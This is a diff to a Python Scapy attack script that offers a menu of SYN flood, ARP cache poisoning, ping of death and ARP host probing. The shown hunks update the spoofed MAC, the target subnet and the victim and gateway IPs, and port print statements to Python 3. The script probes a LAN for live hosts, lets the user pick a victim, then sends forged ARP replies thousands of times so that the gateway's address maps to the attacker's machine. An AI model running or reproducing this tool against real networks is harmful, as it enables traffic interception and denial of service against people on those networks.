@@ -40,7 +40,7 @@ def send_arp_cache_poison(victimAddr,attackAddr,gatewayAddr):
      sendloop(Ehter(dst=gatewaymac.hwsrc)/ARP(op=2,psrc=victim,hwsrc=attackmac.hwsrc,pdst=gatewayAddr))
      '''
 #   victim's arp cache has been substituded. The gateway's IP(192.168.0.1) mapped to attack's hardware address.
-    p1=Ether(dst="ff:ff:ff:ff:ff:ff",src="48:d7:05:c1:d6:63")/ARP(pdst=victimAddr,psrc=gatewayAddr)
+    p1=Ether(dst="ff:ff:ff:ff:ff:ff",src="3c:22:fb:11:ac:b1")/ARP(pdst=victimAddr,psrc=gatewayAddr)
     for i in range(6000):
         sendp(p1)
         time.sleep(0.1)
@@ -54,7 +54,7 @@ def send_arp_probe():
 #   The name of network card of MacBook is usually called 'en0'  
     wifi = 'en0'
     #模拟发包,向整个网络发包，如果有回应，则表示活跃的主机
-    p=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='192.168.0.0/24')
+    p=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='192.168.1.0/24')
     #ans表示收到的包的回复
     ans,unans=srp(p,iface=wifi,timeout=5)
      
@@ -75,18 +75,18 @@ def send_arp_probe():
         print(ip,'------>',mac)
     for i in range(0,len(ipList)):
         print("choose %d "%i,ipList[i])
-    print'\n the number must between 0 and ',(len(ipList)-1)
+#    print('\n the number must between 0 and ',(len(ipList)-1))
     choseNumber=int(input("\nPlease input the number that you choose:"))
     if  choseNumber<len(ipList):
         AttackAddr = ipList[choseNumber]
-        send_arp_cache_poison(AttackAddr,"192.168.0.10","192.168.0.1")
+        send_arp_cache_poison(AttackAddr,"192.168.1.6","192.168.1.1")
     else:
-        print 'The number you choose is invalid'
+        print('The number you choose is invalid')
 
 
 def main():
     while True:
-        print"1.tcp_syn 2.arp_cache_poison 3.ping of death 4.arp_probe\n"
+        print("1.tcp_syn 2.arp_cache_poison 3.ping of death 4.arp_probe\n")
         num = float(input("Please input the command: "))
         if num == 1:
             while 1:
@@ -101,7 +101,7 @@ def main():
         elif num == 9:
             break
         else: 
-            print"The operation is not exist!\n"
+            print("The operation is not exist!\n")
 if __name__ == "__main__":
     main()
 
